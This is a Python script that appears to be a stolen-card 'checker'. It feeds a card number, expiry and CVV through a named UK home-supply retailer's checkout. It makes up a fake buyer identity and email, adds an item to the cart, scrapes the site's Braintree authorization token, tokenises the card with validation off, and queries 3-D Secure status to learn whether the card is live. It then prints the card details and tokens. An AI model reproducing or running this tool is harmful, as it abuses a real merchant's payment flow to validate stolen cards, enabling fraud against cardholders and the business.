import base64
import requests
import names
import random
import string
import json


def getCC(entrada):
    datos = entrada.split('|')
    cc = datos[0]
    mm = datos[1]
    yy = datos[2]
    cvv = datos[3]
    return cc, mm, yy, cvv
inputcc = input("input Card: ")
cc, mm, yy, cvv = getCC(inputcc)


mail = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"
num = random.randint(9876655444, 9998765433)

api = requests.get(f"https://randomuser.me/api/?nat=gb&inc=name,location").json()
name = api["results"][0]["name"]["first"]
last = api["results"][0]["name"]["last"]
street = api["results"][0]["location"]["street"]["name"]
snm = api["results"][0]["location"]["street"]["number"]
city = api["results"][0]["location"]["city"]
state = api["results"][0]["location"]["state"]
zip = api["results"][0]["location"]["postcode"]


def session_id():
    codigo = (
    ''.join(random.choices(string.ascii_lowercase, k=2)) +
    ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) +
    '-' +
    ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) +
    '-' +
    ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) +
    '-' +
    ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) +
    '-' +
    ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
)
    return codigo
ss_id = session_id()


web = requests.Session()

#////REQUEST 0/////
h = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
req = web.get("https://www.homesupply.co.uk/Moods-Deco-Deck-Mounted-Chrome-Basin-Pillar-Taps")

#////REQUEST 1/////
h1 = {'Accept': '*/*','Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.homesupply.co.uk', 'Referer': 'https://www.homesupply.co.uk/Moods-Deco-Deck-Mounted-Chrome-Basin-Pillar-Taps', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
p1 = {'action': 'addtocart',}
d1 = {    'ajaxadd': 'true', 'id': 'MOOD105751', 'mode': 'add', 'quant': '1',}
req1 = web.post("https://www.homesupply.co.uk/vsadmin/shipservice.php", headers=h1, params=p1, data=d1)

#////REQUEST 2/////
h2 = {'Accept': '*/*','Content-type': 'application/x-www-form-urlencoded',    'Origin': 'https://www.homesupply.co.uk', 'Referer': 'https://www.homesupply.co.uk/Moods-Deco-Deck-Mounted-Chrome-Basin-Pillar-Taps', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
req2 = web.get("https://www.homesupply.co.uk/vsadmin/miniajaxdropdowncart.php?action=refresh")

# if "1 Product(s) in basket" in req2.text:
#     print("add cart ok")
# else:
#     print("Error adding to cart")

#////REQUEST 3/////
h3 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','Referer': 'https://www.homesupply.co.uk/Moods-Deco-Deck-Mounted-Chrome-Basin-Pillar-Taps', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
req3 = web.get("https://www.homesupply.co.uk/cart.php", headers=h3)

#////BEARER CAP/////
lo = req3.text
ini = lo.find("var auth='") + len("var auth='")
fin = lo.find("';", ini)
bear = lo[ini:fin]
rev = base64.b64decode(bear).decode('utf-8')
cap  = json.loads(rev)
bearer = cap["authorizationFingerprint"]

#////REQUEST 4/////
h4 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.homesupply.co.uk', 'Referer': 'https://www.homesupply.co.uk/cart.php', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
d4 = { 'mode': 'go', 'sessionid': f'{ss_id}', 'PARTNER': '', 'altrates': '', 'addaddress': 'add', 'saddaddress': 'add', 'ordextra1': 'DKS', 'name': f'{name}', 'lastname': f'{last}', 'email': f'{mail}', 'country': '201', 'zip': f'{zip}', 'address': f'{street} {snm}', 'address2': f'{street} {snm}', 'city': f'{city}', 'state': f'{state}', 'state2': f'{state}', 'phone': f'{num}', 'ordextra2': '', 'ordsextra1': '', 'sname': '', 'slastname': '', 'scountry': '', 'saddress': '', 'saddress2': '', 'scity': '', 'sstate2': '', 'szip': '', 'sphone': '', 'ordsextra2': '', 'ordAddInfo': '', 'license': '1', 'cpncode': '', 'token': '', 'payerid': '', 'checktmplogin': 'x', 'payprovider': '25',}
req4 = web.post("https://www.homesupply.co.uk/cart.php", headers=d4, data=d4)

#////REQUEST 5/////
h5 = {'accept': '*/*','authorization': f'Bearer {bearer}','braintree-version': '2018-05-10', 'origin': 'https://assets.braintreegateway.com', 'referer': 'https://assets.braintreegateway.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
j5 = {'clientSdkMetadata': {'source': 'client','integration': 'dropin2','sessionId': f'{ss_id}'},    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {
            'creditCard': {
                'number': f'{cc}',
                'expirationMonth': f'{mm}',
                'expirationYear': f'{yy}',
                'cvv': f'{cvv}',
                'cardholderName': f'{name} {last}',

                'billingAddress': {'postalCode': f'{zip}',},},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
req5 = web.post("https://payments.braintree-api.com/graphql", headers=h5, json=j5)

#////BRAINTREE TOKEN CAP/////
tk = json.loads(req5.text)["data"]["tokenizeCreditCard"]["token"]

#////REQUEST 6/////
h6 = {'accept': '*/*', 'content-type': 'application/json','origin': 'https://www.homesupply.co.uk','referer': 'https://www.homesupply.co.uk/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
j6 = {'amount': '38.12','additionalInfo': {'acsWindowSize': '03',},
    'bin': f'{cc[:6]}','dfReferenceId': '0_f9afa8d0-1305-460d-a66a-9fecf1399696','clientMetadata': {'requestedThreeDSecureVersion': '2','sdkVersion': 'web/3.80.0','cardinalDeviceDataCollectionTimeElapsed': 2975,'issuerDeviceDataCollectionTimeElapsed': 308,'issuerDeviceDataCollectionResult': True,},
    'authorizationFingerprint': f'{bearer}','braintreeLibraryVersion': 'braintree/web/3.80.0','_meta': {'merchantAppId': 'www.homesupply.co.uk','platform': 'web','sdkVersion': '3.80.0','source': 'client','integration': 'custom','integrationType': 'custom','sessionId': f'{ss_id}',},}
req6 = web.post(f"https://api.braintreegateway.com/merchants/783bjypvhzt74767/client_api/v1/payment_methods/{tk}/three_d_secure/lookup", headers=h6, json=j6)

#////RESPONSES CAP/////
ree = json.loads(req6.text)
resp = ree["paymentMethod"]["threeDSecureInfo"]["status"]
roll = ree["paymentMethod"]["threeDSecureInfo"]["enrolled"]

web.close()


print(f"""

/// PETICION REALIZADA CON EXITO ///
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Card: {cc}|{mm}|{yy}|{cvv}
Response: {resp} | {roll}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Datos usados:
{name} {last}
{street} {snm}
{city}
{state}
{zip}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TokenB3: {tk}
Bearer: {bearer}
""")



